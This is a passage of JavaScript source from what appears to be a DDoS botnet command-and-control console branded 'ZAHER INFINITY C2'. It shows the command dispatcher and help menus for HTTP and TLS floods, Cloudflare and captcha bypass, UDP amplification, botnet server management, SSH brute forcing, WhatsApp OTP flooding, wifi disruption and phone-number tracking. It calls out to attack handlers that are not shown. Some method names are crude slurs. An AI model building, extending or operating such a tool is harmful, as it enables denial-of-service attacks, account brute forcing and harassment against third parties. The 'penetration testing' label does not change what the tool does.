  const latestNews = await getNews.text();
  
  const creatorCredits = `${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                      ${gold}DEVELOPMENT CREDITS & INFO${cyan}                     ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_green}ZAHER INFINITY C2 - Ultimate Penetration Testing Suite${cyan}           ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${gold}Lead Developer:${cyan} ${yellow}ZAHER INFINITY C2${cyan}${' '.repeat(48)}║
║ ${gold}Original Concept:${cyan} ${green}Aditteji${cyan}${' '.repeat(51)}║
║ ${gold}System Architecture:${cyan} ${cyan}XI-EYES${cyan}${' '.repeat(52)}║
║ ${gold}Method Development:${cyan} ${purple}FdilzXDilzX${cyan}${' '.repeat(49)}║
║ ${gold}Base Framework:${cyan} ${silver}PermenMD${cyan}${' '.repeat(51)}║
║ ${gold}Version:${cyan} ${orange}${version}${cyan}${' '.repeat(60 - version.length)}║
║ ${gold}License:${cyan} ${red}PRIVATE - AUTHORIZED USE ONLY${cyan}${' '.repeat(36)}║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`;
  
  permen.question(`${bg_dark_red}${bold}${yellow}ZA∞ER${Reset} ${cyan}»${Reset} ${bg_dark_blue}${bold}${neon_green}CONTROL${Reset}: `, (input) => {
    const [command, ...args] = input.trim().split(/\s+/);

    if (command === 'help') {
      console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                    ${gold}ZAHER INFINITY C2 - COMMAND REFERENCE${cyan}               ║
╠══════════════════════════════════════════════════════════════════════════════╣
║${neon_green}                          [ SYSTEM COMMANDS ]${cyan}                          ║
║  ${blue}•${Reset} ${silver}help${Reset}         - Display this command reference               ${cyan}║
║  ${blue}•${Reset} ${silver}methods${Reset}      - List all available attack methods            ${cyan}║
║  ${blue}•${Reset} ${silver}srvmenu${Reset}      - Display server operations menu               ${cyan}║
║  ${blue}•${Reset} ${silver}cls${Reset}          - Clear terminal screen                        ${cyan}║
║  ${blue}•${Reset} ${silver}news${Reset}         - Show latest security news                   ${cyan}║
║  ${blue}•${Reset} ${silver}credits${Reset}      - Display developer credits                    ${cyan}║
║${yellow}                          [ RECONNAISSANCE ]${cyan}                            ║
║  ${blue}•${Reset} ${silver}track-ip${Reset}     - Geolocate and analyze IP addresses          ${cyan}║
║  ${blue}•${Reset} ${silver}TrackNumber${Reset}  - Intelligence gathering for phone numbers    ${cyan}║
║  ${blue}•${Reset} ${silver}subdo-finder${Reset} - Enumerate subdomains of target domain       ${cyan}║
║  ${blue}•${Reset} ${silver}monitor${Reset}      - Real-time attack monitoring dashboard       ${cyan}║
║${red}                          [ ATTACK VECTORS ]${cyan}                            ║
║  ${blue}•${Reset} ${silver}attack${Reset}       - Launch DDoS attack with specified method    ${cyan}║
║  ${blue}•${Reset} ${silver}srvattack${Reset}    - Distributed attack via botnet servers       ${cyan}║
║  ${blue}•${Reset} ${silver}udp-raw${Reset}      - UDP amplification flood attack              ${cyan}║
║  ${blue}•${Reset} ${silver}mc-flood${Reset}     - Minecraft server botnet flood               ${cyan}║
║  ${blue}•${Reset} ${silver}samp${Reset}         - S.A.M.P game server flooder                 ${cyan}║
║${purple}                          [ SPECIALIZED TOOLS ]${cyan}                        ║
║  ${blue}•${Reset} ${silver}kill-wifi${Reset}    - Wireless network disruption tool            ${cyan}║
║  ${blue}•${Reset} ${silver}kill-ssh${Reset}     - SSH credential brute force attack           ${cyan}║
║  ${blue}•${Reset} ${silver}kill-otp${Reset}     - WhatsApp OTP verification flood             ${cyan}║
║  ${blue}•${Reset} ${silver}kill-do${Reset}      - Digital Ocean VPS destruction suite         ${cyan}║
║  ${blue}•${Reset} ${silver}kill-ping${Reset}    - ICMP ping flood attack                      ${cyan}║
║${neon_blue}                          [ SERVER MANAGEMENT ]${cyan}                      ║
║  ${blue}•${Reset} ${silver}addsrv${Reset}       - Add new server to botnet network            ${cyan}║
║  ${blue}•${Reset} ${silver}testsrv${Reset}      - Test and validate botnet servers            ${cyan}║
║  ${blue}•${Reset} ${silver}ongoing${Reset}      - View current attack sessions                ${cyan}║
║${green}                          [ AI INTEGRATION ]${cyan}                           ║
║  ${blue}•${Reset} ${silver}ai${Reset}           - Access Cosmic AI chat interface             ${cyan}║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}
`);
      sigma();
    } else if (command === 'methods') {
      console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                    ${gold}ZAHER INFINITY C2 - ATTACK METHODOLOGY${cyan}               ║
╠══════════════════════════════════════════════════════════════════════════════╣
║${red}                          [ VIP METHODS ]${cyan}                            ║
║  ${blue}•${Reset} ${red}flood${Reset}       - High-volume HTTP/HTTPS request flood          ${cyan}║
║  ${blue}•${Reset} ${red}tls${Reset}         - TLS handshake exhaustion attack              ${cyan}║
║  ${blue}•${Reset} ${red}strike${Reset}      - Multi-vector combined attack                 ${cyan}║
║  ${blue}•${Reset} ${red}kill${Reset}        - Cloudflare bypass with spoofed headers       ${cyan}║
║  ${blue}•${Reset} ${red}raw${Reset}         - Raw socket maximum throughput attack         ${cyan}║
║${yellow}                          [ POWER METHODS ]${cyan}                         ║
║  ${blue}•${Reset} ${yellow}thunder${Reset}     - Amplified request storm                     ${cyan}║
║  ${blue}•${Reset} ${yellow}storm${Reset}       - Cloudflare/UAM protection bypass           ${cyan}║
║  ${blue}•${Reset} ${yellow}xcosmic${Reset}     - Advanced multi-protocol bypass             ${cyan}║
║  ${blue}•${Reset} ${yellow}destroy${Reset}     - Socket connection exhaustion               ${cyan}║
║  ${blue}•${Reset} ${yellow}slim${Reset}        - Low-resource high-efficiency attack        ${cyan}║
║${green}                          [ ADVANCED METHODS ]${cyan}                      ║
║  ${blue}•${Reset} ${green}quantum${Reset}     - Quantum tunneling bypass technique          ${cyan}║
║  ${blue}•${Reset} ${green}h2raw${Reset}       - HTTP/2 protocol exploitation                ${cyan}║
║  ${blue}•${Reset} ${green}xyn${Reset}         - AI-optimized attack patterns                ${cyan}║
║  ${blue}•${Reset} ${green}nuke${Reset}        - Maximum payload destructive attack          ${cyan}║
║  ${blue}•${Reset} ${green}ninja${Reset}       - Stealth mode with randomized patterns       ${cyan}║
║${purple}                          [ ZAHER SPECIALS ]${cyan}                       ║
║  ${blue}•${Reset} ${purple}skynet-tls${Reset}   - AI-driven TLS session flood                ${cyan}║
║  ${blue}•${Reset} ${purple}tiji-bypas${Reset}   - Advanced captcha bypass system             ${cyan}║
║  ${blue}•${Reset} ${purple}bomber${Reset}       - Sequential request bombardment             ${cyan}║
║  ${blue}•${Reset} ${purple}glory${Reset}        - Glory attack framework v1                  ${cyan}║
║  ${blue}•${Reset} ${purple}tls-bypass${Reset}   - TLS 1.3+ bypass technique                  ${cyan}║
║  ${blue}•${Reset} ${purple}tijih${Reset}        - Hybrid attack methodology                  ${cyan}║
║  ${blue}•${Reset} ${purple}hold${Reset}         - Persistent connection hold attack          ${cyan}║
║  ${blue}•${Reset} ${purple}cf-bs${Reset}        - Cloudflare business plan bypass            ${cyan}║
║  ${blue}•${Reset} ${purple}gloryv2${Reset}      - Glory attack framework v2                  ${cyan}║
║  ${blue}•${Reset} ${purple}pidoras${Reset}      - Russian nesting doll attack pattern        ${cyan}║
║  ${blue}•${Reset} ${purple}ultrados${Reset}     - Ultimate DDoS with multiple vectors        ${cyan}║
║  ${blue}•${Reset} ${purple}kilpanelig${Reset}   - Control panel specific attack              ${cyan}║
║  ${blue}•${Reset} ${purple}kilpanelip${Reset}   - IP-based panel targeting                   ${cyan}║
║  ${blue}•${Reset} ${purple}reset${Reset}        - Connection reset attack                    ${cyan}║
║  ${blue}•${Reset} ${purple}https${Reset}        - HTTPS specific vulnerabilities             ${cyan}║
║  ${blue}•${Reset} ${purple}medusa${Reset}       - Multi-headed attack pattern                ${cyan}║
║  ${blue}•${Reset} ${purple}rape${Reset}         - Extreme resource consumption               ${cyan}║
║  ${blue}•${Reset} ${purple}kilpanel${Reset}     - Web control panel destruction              ${cyan}║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}
`);
      sigma();
    } else if (command === 'srvmenu') {
      console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                     ${gold}BOTNET SERVER MANAGEMENT${cyan}                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║${neon_green}                          [ SERVER OPERATIONS ]${cyan}                        ║
║  ${blue}•${Reset} ${silver}srvattack${Reset}   - Launch distributed attack via botnet         ${cyan}║
║  ${blue}•${Reset} ${silver}testsrv${Reset}     - Test and validate all botnet servers         ${cyan}║
║  ${blue}•${Reset} ${silver}addsrv${Reset}      - Add new server endpoint to network           ${cyan}║
║  ${blue}•${Reset} ${silver}monitor${Reset}     - Real-time attack monitoring                  ${cyan}║
╠══════════════════════════════════════════════════════════════════════════════╣
║${gold}                          [ VIP SERVER METHODS ]${cyan}                      ║
║  ${blue}•${Reset} ${gold}Https${Reset}       - Browser-emulated HTTPS flood                 ${cyan}║
║  ${blue}•${Reset} ${gold}Raw${Reset}         - Maximum throughput raw attack                ${cyan}║
║  ${blue}•${Reset} ${gold}Cibi${Reset}        - Cibernetic intelligence attack               ${cyan}║
║  ${blue}•${Reset} ${gold}H2raw${Reset}       - HTTP/2 protocol exploitation                ${cyan}║
║  ${blue}•${Reset} ${gold}Reset${Reset}       - Connection reset storm                      ${cyan}║
║  ${blue}•${Reset} ${gold}Xyn${Reset}         - AI-optimized attack patterns                ${cyan}║
╠══════════════════════════════════════════════════════════════════════════════╣
║${yellow}                          [ BYPASS TECHNIQUES ]${cyan}                       ║
║  ${blue}•${Reset} ${yellow}Strike${Reset}      - VSE bypass with rotating proxies            ${cyan}║
║  ${blue}•${Reset} ${yellow}Bypass${Reset}      - Quantum tunneling technique                ${cyan}║
║  ${blue}•${Reset} ${yellow}Tls${Reset}         - TLS session exhaustion                     ${cyan}║
║  ${blue}•${Reset} ${yellow}Ninja${Reset}       - Stealth mode with randomization            ${cyan}║
║  ${blue}•${Reset} ${yellow}Mix${Reset}         - Combined attack vectors                    ${cyan}║
║  ${blue}•${Reset} ${yellow}Nuke${Reset}        - Maximum destructive power                  ${cyan}║
║  ${blue}•${Reset} ${yellow}Pidoras${Reset}     - Advanced Russian bypass                    ${cyan}║
║  ${blue}•${Reset} ${yellow}Storm${Reset}       - Cloudflare protection bypass               ${cyan}║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}
`);
      sigma();
    } else if (command === 'TrackNumber') {
      TrackNumber(args);
    } else if (command === 'monitor') {
      monitorOngoingAttacks();
    } else if (command === 'news') {
      console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                         ${gold}SECURITY NEWS FEED${cyan}                          ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_blue}${latestNews}${cyan}${' '.repeat(70)}║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}
`);
      sigma();
    } else if (command === 'credits') {
      console.log(creatorCredits);
      sigma();
    } else if (command === 'attack') {
      handleAttackCommand(args);
    } else if (command === 'kill-ssh') {
      killSSH(args);
    } else if (command === 'kill-otp') {
      killOTP(args);
    } else if (command === 'udp-raw') {
      udp_flood(args);
    } else if (command === 'kill-do') {
      killDo(args);
    } else if (command === 'ongoing') {
      ongoingAttack();
      sigma();
    } else if (command === 'track-ip') {
      trackIP(args);
    } else if (command === 'ai') {
      console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
      console.log(`${bold}${cyan}║                         ${gold}COSMIC AI INITIALIZED${cyan}                       ║${Reset}`);
      console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
      console.log(`${bold}${cyan}║ ${silver}Type 'exit' to return to main menu${cyan}${' '.repeat(38)}║${Reset}`);
      console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
      chat_ai();
    } else if (command === 'mc-flood') {
      mcbot(args);
    } else if (command === 'kill-ping') {
      // Placeholder for ping function
      console.log(`${yellow}⚠ Ping flood feature is currently under development${Reset}`);
      sigma();
    } else if (command === 'samp') {
      samp(args);
    } else if (command === 'subdo-finder') {
      subdomen(args);
    } else if (command === 'kill-wifi') {
      killWifi();
    } else if (command === 'addsrv') {
      processBotnetEndpoint(args);
    } else if (command === 'testsrv') {
      checkBotnetEndpoints();
    } else if (command === 'srvattack') {
      AttackBotnetEndpoints(args);
    } else if (command === 'cls') {
      banner();
      sigma();
    } else {
      console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
      console.log(`${bold}${cyan}║                          ${red}COMMAND NOT FOUND${cyan}                           ║${Reset}`);
      console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
      console.log(`${bold}${cyan}║ ${yellow}Unknown command: ${red}${command}${cyan}${' '.repeat(68 - command.length)}║${Reset}`);
      console.log(`${bold}${cyan}║ ${silver}Type 'help' for available commands${cyan}${' '.repeat(41)}║${Reset}`);
      console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
      sigma();
    }
  });
}

// [========================================] //
function clearall() {
  clearProxy();
  clearUserAgent();
}

// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
  console.log(`${bold}${cyan}║                         ${gold}SYSTEM SHUTDOWN INITIATED${cyan}                     ║${Reset}`);
  console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
  clearall();
  process.exit();
});

process.on('SIGTERM', () => {
  console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
  console.log(`${bold}${cyan}║                          ${red}TERMINATION SIGNAL RECEIVED${cyan}                    ║${Reset}`);
  console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
  clearall();
  process.exit();
});

// [========================================] //
bootup();